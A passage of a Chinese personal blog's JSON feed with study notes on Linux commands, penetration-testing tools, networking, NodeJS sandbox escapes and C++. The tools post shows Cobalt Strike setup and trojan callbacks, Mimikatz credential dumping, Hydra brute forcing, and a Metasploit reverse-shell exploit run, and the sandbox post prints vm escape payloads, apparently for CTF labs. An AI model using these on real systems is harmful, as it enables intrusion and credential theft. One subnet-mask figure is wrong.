地址与域名快速解析</p>\n<h1 id=\"wget\"><a class=\"anchor\" href=\"#wget\">#</a> wget</h1>\n<p>下载文件</p>\n<h1 id=\"mkdir\"><a class=\"anchor\" href=\"#mkdir\">#</a> mkdir</h1>\n<p><code>mkdir -p</code>  确保目录名称存在</p>\n<h1 id=\"ls-a\"><a class=\"anchor\" href=\"#ls-a\">#</a> ls -a</h1>\n<p>显示当前目录中的所有文件和目录，包括<strong>隐藏</strong>文件</p>\n<p><code>cat .flag.txt</code>  打开隐藏的 txt</p>\n",
            "tags": [
                "Web",
                "Linux"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E5%B7%A5%E5%85%B7/",
            "url": "http://yoursite.com/Web/%E5%B7%A5%E5%85%B7/",
            "title": "Web常用工具",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"fscan\"><a class=\"anchor\" href=\"#fscan\">#</a> fscan</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZpdmVyeWEvYXJ0aWNsZS9kZXRhaWxzLzEyNzkwMzU2OQ==\">https://blog.csdn.net/Fiverya/article/details/127903569</span></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git clone https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>shadow1ng<span class=\"token operator\">/</span>fscan<span class=\"token punctuation\">.</span>git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>wget https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>dl<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span><span class=\"token keyword\">go</span><span class=\"token operator\">/</span>go1<span class=\"token punctuation\">.</span><span class=\"token number\">17.8</span><span class=\"token punctuation\">.</span>linux<span class=\"token operator\">-</span>amd64<span class=\"token punctuation\">.</span>tar<span class=\"token punctuation\">.</span>gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>tar <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span> <span class=\"token operator\">-</span>xzf go1<span class=\"token punctuation\">.</span><span class=\"token number\">17.8</span><span class=\"token punctuation\">.</span>linux<span class=\"token operator\">-</span>amd64<span class=\"token punctuation\">.</span>tar<span class=\"token punctuation\">.</span>gz</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Go环境变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>vim ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>┌──<span class=\"token punctuation\">(</span>root💀kali<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token punctuation\">[</span>~<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>└─# cat ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile         </pre></td></tr><tr><td data-num=\"10\"></td><td><pre># ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile<span class=\"token punctuation\">:</span> executed by Bourne<span class=\"token operator\">-</span>compatible login shells<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">\"$BASH\"</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> then</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token operator\">-</span>f ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>bashrc <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> then</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">.</span> ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>bashrc</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  fi</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>mesg n <span class=\"token operator\">||</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>export PATH<span class=\"token operator\">=</span>$PATH<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token keyword\">go</span><span class=\"token operator\">/</span>bin</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>source ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">go</span> env 查看环境变量</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">go</span> env <span class=\"token operator\">-</span>w GO111MODULE<span class=\"token operator\">=</span>on</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">go</span> env <span class=\"token operator\">-</span>w GOPROXY<span class=\"token operator\">=</span>https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>goproxy<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">,</span>direct</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">go</span> mod tidy</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">go</span> build <span class=\"token operator\">-</span>ldflags<span class=\"token operator\">=</span><span class=\"token string\">\"-s -w \"</span> <span class=\"token operator\">-</span>trimpath main<span class=\"token punctuation\">.</span><span class=\"token keyword\">go</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>main <span class=\"token operator\">-</span>h <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.128</span></pre></td></tr></table></figure><h1 id=\"cobalt-strike\"><a class=\"anchor\" href=\"#cobalt-strike\">#</a> Cobalt Strike</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYwNTcxODQyL2FydGljbGUvZGV0YWlscy8xMzI5MjA2NzI=\">CobaltStrike4.8 汉化版带插件_cobaltstrike 下载 - CSDN 博客</span></p>\n<p>[【渗透测试笔记】之【内网渗透 —— 横向移动：PsExec 的使用】_横向渗透 psexec-CSDN 博客](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODc0NjQ1L2FydGljbGUvZGV0YWlscy8xMjEzOTQ2NzgjOn46dGV4dD1DUyVFNCVCOCVBRCVFNyU5QSU4NFBzRXhlYw==\">https://blog.csdn.net/qq_44874645/article/details/121394678#:~:text=CS 中的 PsExec</span> 2.1 查看目标所在网段其它主机 扫描主机 列出主机，2.2 使用 PsExec 横向移动 右键要横向的目标主机，选择 psexec 的版本（32 位 64 位或 PowerShell）。 选择已经获得的凭据（明文、散列值、令牌都可以）、回连的 listener、进行横向的 session。 点击 Launch，即会返回一个 DC-1 的 session。)</p>\n<p>xftp 上传 server 文件夹（需要 ssh 服务）</p>\n<p>KALI 服务端部署</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span>  cs //当前目录建一个cs目录 存放cs文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> cs</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">chmod</span> a+x ./teamserver  给权限</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ifconfig</span> //查看本机IP地址 要与客户机ping得通  才可以连接</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>./teamserver <span class=\"token number\">192.168</span>.57.128 <span class=\"token number\">123456</span>  //本机ip+密码-密码随便设置</pre></td></tr></table></figure><p>Windows 客户端部署</p>\n<p>双击 client 文件夹下的 Cobalt_Strike_CN.vbs，连接时用 kali 的 ip 地址，监听器设置的也是 kali，生成木马运行后会自动获取受害机 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sleep</span> <span class=\"token number\">3</span> 全部命令3秒执行<span class=\"token punctuation\">(</span>默认时60秒太长，<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行系统命令要在命令前加个  shell <span class=\"token function\">whoami</span></pre></td></tr></table></figure><h2 id=\"mimikatz\"><a class=\"anchor\" href=\"#mimikatz\">#</a> Mimikatz</h2>\n<p>提取 windows 凭据的密码</p>\n<p>管理员身份执行： <code>logonpasswords</code></p>\n<h2 id=\"psexec\"><a class=\"anchor\" href=\"#psexec\">#</a> PSexec</h2>\n<h1 id=\"rips\"><a class=\"anchor\" href=\"#rips\">#</a> RIPS</h1>\n<p>PHP 代码审计</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjUxNTU4OC9hcnRpY2xlL2RldGFpbHMvMTIzOTY1NzQ0\">https://blog.csdn.net/weixin_52515588/article/details/123965744</span></p>\n<h1 id=\"fortify\"><a class=\"anchor\" href=\"#fortify\">#</a> Fortify</h1>\n<p>代码审计软件</p>\n<ol>\n<li>把 <code>fortify.license</code>  和 <code>Fortify_SCA_23.1.0_windows_x64.exe</code> 、 <code>Fortify_Apps_and_Tools_23.1.0_windows_x64.exe</code> <br />\n 剪贴放在同一目录，不要有中文。</li>\n<li>安装 <code>Fortify_SCA_23.1.0_windows_x64.exe</code>  和 <code>Fortify_Apps_and_Tools_23.1.0_windows_x64.exe</code> ，程序会自动找到 <code>fortify.license</code>  授权文件</li>\n<li>把 <code>fortify-common-23.1.0.0028.jar</code>  分别拷贝到 <code>Fortify\\Fortify_SCA_23.1.0\\Core\\lib\\</code> <br />\n 和 <code>Fortify\\Fortify_Apps_and_Tools_23.1.0\\Core\\lib\\</code>  替换覆盖</li>\n<li>解压 <code>FortifyRules_zh_CH_2023.1.1.0001(离线规则库).zip</code>  规则库，把 <code>ExternalMetadata</code>  和 <code>rules</code>  文件夹拷贝到 <code>Fortify\\Fortify_SCA_23.1.0\\Core\\config</code>  下</li>\n<li>运行 <code>Fortify\\Fortify_Apps_and_Tools_23.1.0\\bin</code>  下的 <code>auditworkbench.cmd</code>  即可开启 GUI 界面</li>\n<li>根据需要配置扫描即可</li>\n<li>规则库：直接本地无法升级规则库，离线升级及最新中英文规则库。</li>\n</ol>\n<h1 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> Nmap</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>扫整个网段ip存活情况nmap <span class=\"token operator\">-</span>sP <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>扫描开放端口的服务版本nmap <span class=\"token operator\">-</span>sV <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>单独扫描域名nmap <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>全端口扫描nmap <span class=\"token operator\">-</span>sV <span class=\"token operator\">-</span>p<span class=\"token operator\">-</span> <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>扫描端口服务的详细信息nmap <span class=\"token operator\">-</span>sS <span class=\"token operator\">-</span>sV <span class=\"token operator\">-</span>A <span class=\"token operator\">-</span>T5 <span class=\"token operator\">-</span>p55006<span class=\"token punctuation\">,</span><span class=\"token number\">55007</span> <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr></table></figure><h1 id=\"hydra\"><a class=\"anchor\" href=\"#hydra\">#</a> Hydra</h1>\n<p>九头蛇暴力破解</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo命令两个用户名写入txt文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gedit name<span class=\"token punctuation\">.</span>txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo <span class=\"token operator\">-</span>e <span class=\"token string\">'natalya\\nboris'</span> <span class=\"token operator\">></span> name<span class=\"token punctuation\">.</span>txt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Hydra自带的字典进行密码爆破</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hydra <span class=\"token operator\">-</span>L name<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>P <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>wordlists<span class=\"token operator\">/</span>fasttrack<span class=\"token punctuation\">.</span>txt <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span> <span class=\"token operator\">-</span>s <span class=\"token number\">55007</span> pop3</pre></td></tr></table></figure><h1 id=\"metasploit\"><a class=\"anchor\" href=\"#metasploit\">#</a> Metasploit</h1>\n<pre><code class=\"language-Python\">msfconsole                        ---进入MSF框架攻击界面\nsearch moodle                     ---查找 moodle这个CMS的攻击的模块\nuse 1(攻击脚本编号)                ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本\nshow options                      ---查看需要填充的变量\nset username admin                ---设置用户名：admin\nset password xWinter1995x!        ---设置密码：xWinter1995x!\nset rhost severnaya-station.com   ---设置：rhosts severnaya-station.com\nset targeturi /gnocertdir         ---设置目录： /gnocertdir\nset payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse（linux内核，Linux是一个                                      类 Unix 操作系统）\nset lhost 192.168.200.131         ---设置：lhost 192.168.200.131（需要本地IP）\nexploit  ----执行命令\n</code></pre>\n<h1 id=\"cewl\"><a class=\"anchor\" href=\"#cewl\">#</a> cewl</h1>\n<p>通过爬行网站获取关键信息创建一个密码字典</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cewl http<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span><span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.136</span><span class=\"token punctuation\">:</span><span class=\"token number\">1898</span><span class=\"token operator\">/</span>?q<span class=\"token operator\">=</span>node<span class=\"token operator\">/</span><span class=\"token number\">1</span> <span class=\"token operator\">-</span>w xxg<span class=\"token punctuation\">.</span>txt</pre></td></tr></table></figure><h1 id=\"proxychains\"><a class=\"anchor\" href=\"#proxychains\">#</a> proxychains</h1>\n<p>CentOS</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>yum <span class=\"token function\">install</span> epel-release</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> proxychains-ng</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">vi</span> /etc/proxychains.conf</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 将 socks4 127.0.0.1 9095 改为香港 / 国外代理服务器 ip port</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>socks5 <span class=\"token number\">127.0</span>.0.1 <span class=\"token number\">10808</span></pre></td></tr></table></figure><h1 id=\"ciphey\"><a class=\"anchor\" href=\"#ciphey\">#</a> Ciphey</h1>\n<p>Ciphey 不适用于使用 Python 3.9+ 的 Windows，请使用 Python 3.7 或 Python 3.8。其他平台使用 Python 3.9 没问题，Python 3.10 不行。</p>\n<p><strong>Windows</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-m</span> pip <span class=\"token function\">install</span> <span class=\"token parameter variable\">-U</span> pip</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pip <span class=\"token function\">install</span> <span class=\"token parameter variable\">--upgrade</span> setuptools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>python <span class=\"token parameter variable\">-m</span> pip <span class=\"token function\">install</span> <span class=\"token parameter variable\">-U</span> ciphey</pre></td></tr></table></figure><p><strong>Linux</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip3 <span class=\"token function\">install</span> <span class=\"token parameter variable\">-U</span> pip</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3 <span class=\"token parameter variable\">-m</span> pip <span class=\"token function\">install</span> ciphey <span class=\"token parameter variable\">--upgrade</span></pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/",
            "url": "http://yoursite.com/Web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/",
            "title": "计算机网络基础",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"子网掩码\"><a class=\"anchor\" href=\"#子网掩码\">#</a> 子网掩码</h1>\n<p>二进制换算成十六进制</p>\n<p><code>11111111.11111111.11111111.00000000(网络号)(主机号)</code></p>\n<p>C 网默认的子网掩码是： <code>255.255.255.0</code></p>\n<p><code>192.168.1.53/27</code>  对应的子网掩码是 <code>255.255.255.254</code></p>\n<p><code>11111111.11111111.11111111.11100000(网络号)(主机号)</code></p>\n<p>网络号向主机号借了 3 位（27-24）, 子网有 8 个，最大容纳主机数 32 个 (0 的个数)</p>\n<h1 id=\"cmd\"><a class=\"anchor\" href=\"#cmd\">#</a> cmd</h1>\n<p><code>ncpa.cpl</code>   打开网络适配器设置</p>\n<h1 id=\"查本机ip\"><a class=\"anchor\" href=\"#查本机ip\">#</a> 查本机 IP</h1>\n<p><strong>外网 IP</strong></p>\n<ul>\n<li>\n<p>浏览器输入 <code>ip.3322.org</code></p>\n</li>\n<li>\n<p><code>cmd</code>  输入 <code>curl ipinfo.io</code></p>\n</li>\n</ul>\n<p><strong>内网 IP</strong></p>\n<p>看网卡 <code>IPv4</code>  地址</p>\n",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/",
            "title": "沙箱逃逸漏洞总结",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"nodejs\"><a class=\"anchor\" href=\"#nodejs\">#</a> NodeJS</h1>\n<p><code>JavaScript -&gt; 浏览器，前端</code></p>\n<p><code>NodeJS -&gt; 用Chrome中的v8引擎为Javascript开发的运行环境，后端</code></p>\n<ul>\n<li><code>沙箱sandbox</code> ：运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li>\n<li><code>虚拟机VM</code> ：实现一台电脑上使用多个操作系统</li>\n<li><code>容器Docker</code> ：sandbox 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用 Docker 和 sandbox 嵌套的方式更多一点，安全性也更高。</li>\n</ul>\n<h2 id=\"vm逃逸\"><a class=\"anchor\" href=\"#vm逃逸\">#</a> VM 逃逸</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">NodeJS中将字符串执行为代码</span><span class=\"token punctuation\">(</span>作用域也称上下文，Context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1.</span> eval：在当前作用域下执行</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">2.</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：创建新作用域执行</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">两个不同的js文件，作用域也不同，若想调用对方的变量或函数，则需要exports后再require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>导入</pre></td></tr></table></figure><p>Nodejs 中，我们可以通过引入 <code>vm</code>  模块来创建一个沙箱。</p>\n<p>通过传入字符串在沙箱内执行代码，且该新的作用域与外部隔绝</p>\n<p><strong>常用的 vm 模块 API</strong></p>\n<ul>\n<li><code>vm.runinThisContext(code)</code> ：global 下创建一个 <code>sanbox</code>  作用域，接收到的参数作为代码运行；可以访问 global 中的属性，但无法访问其他包中的属性</li>\n<li><code>vm.createContext([sandbox])</code> ：global 外创建一个 <code>sanbox</code>  作用域，沙箱对象就是这个作用域的全局对象，沙箱内部无法访问 global 中的属性</li>\n<li><code>vm.runInContext(code, contextifiedSandbox[, options])</code></li>\n<li><code>vm.runInNewContext(code, sandbox)</code></li>\n<li><code>vm.Script类</code></li>\n<li><code>new vm.Script(code, options)</code></li>\n</ul>\n<p><strong>逃逸方法</strong></p>\n<p>NodeJS 进行 RCE：获取 process 对象后，用 require 导入 child_process，再利用 child_process 执行命令，process 挂载在 global 上。</p>\n<p>需要将<strong> global 上的 process 引入沙箱</strong>中，才能在 <code>createContext</code>  后进行 RCE</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string\">\"use strict\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vm\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> y1 <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">this.constructor.constructor('return process.env')()</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回 process 对象</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>y1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> y1 <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">this.toString.constructor('return process')()</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"vm2逃逸\"><a class=\"anchor\" href=\"#vm2逃逸\">#</a> VM2 逃逸</h2>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE4NTk/dGltZV9fMTMxMT1tcW14MERCRDlEeUR1QllEJTJGUWJpUVFMRUVXRDg3bERmcnJEJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJG\">NodeJS VM 和 VM2 沙箱逃逸</span></p>\n",
            "tags": [
                "Web",
                "Web"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/c++%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/",
            "url": "http://yoursite.com/Algorithm/c++%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/",
            "title": "c++常用函数",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h2 id=\"max\"><a class=\"anchor\" href=\"#max\">#</a> max( )</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>头文件#include <span class=\"token operator\">&lt;</span>algorithm<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>max（ ， ）</pre></td></tr></table></figure><h2 id=\"strlen\"><a class=\"anchor\" href=\"#strlen\">#</a> strlen( )</h2>\n<p>头文件：&lt;cstring&gt;<br />\n 格式：strlen（字符数组名）<br />\n功能：仅计算<strong>字符串 s</strong> 的（unsigned int 型）长度，不包括’\\0’在内，<strong>char [i] == ‘\\0’是字符串结束的标志</strong><br />\n说明：返回 s 的长度，不包括结束符 NULL</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cstring></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Golden Global View\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span> cout <span class=\"token operator\">&lt;&lt;</span> s <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" has \"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" chars\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// Golden Global View has 18 chars</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用strlen时一定要注意是否赋值</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> aa<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>cout<span class=\"token operator\">&lt;&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>aa<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;&lt;</span>endl<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 结果是不定的</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">char</span> aa<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token char\">'\\0'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> cout<span class=\"token operator\">&lt;&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>aa<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;&lt;</span>endl<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 结果为 0</span></pre></td></tr><tr><td 